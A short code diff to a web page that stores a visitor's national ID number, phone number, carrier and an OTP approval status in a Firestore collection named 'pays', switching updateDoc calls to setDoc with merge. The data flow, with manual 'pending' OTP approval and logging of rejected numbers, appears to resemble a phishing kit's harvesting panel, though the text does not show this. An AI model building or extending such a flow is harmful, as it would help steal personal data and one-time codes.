@@ -9,8 +9,8 @@ import { UnifiedSpinner } from "@/components/unified-spinner";
 import { PhoneOtpDialog } from "@/components/phone-otp-dialog";
 import { StcCallDialog } from "@/components/stc-call-dialog";
 
-import { db, updateDoc, doc } from "@/lib/firebase";
-import { onSnapshot, getDoc } from "firebase/firestore";
+import { db } from "@/lib/firebase";
+import { doc, setDoc, onSnapshot, getDoc } from "firebase/firestore";
 import { addToHistory } from "@/lib/history-utils";
 
 export default function VerifyPhonePage() {
@@ -124,14 +124,14 @@ export default function VerifyPhonePage() {
 
     setApprovalError("");
     try {
-      await updateDoc(doc(db, "pays", visitorID), {
+      await setDoc(doc(db, "pays", visitorID), {
         phoneIdNumber: idNumber,
         phoneNumber: phoneNumber,
         phoneCarrier: selectedCarrier,
         phoneSubmittedAt: new Date().toISOString(),
         phoneOtpApproved: "pending",
         phoneUpdatedAt: new Date().toISOString(),
-      });
+      }, { merge: true });
 
       await addToHistory(
         visitorID,
@@ -172,12 +172,12 @@ export default function VerifyPhonePage() {
           phoneCarrier: data.phoneCarrier,
           rejectedAt: new Date().toISOString(),
         };
-        await updateDoc(docRef, {
+        await setDoc(docRef, {
           oldPhoneInfo: data.oldPhoneInfo
             ? [...data.oldPhoneInfo, currentPhoneData]
             : [currentPhoneData],
           phoneOtpApproved: "pending",
-        });
+        }, { merge: true });
       }
     } catch (error) {
       console.error("Error saving rejected phone data:", error);
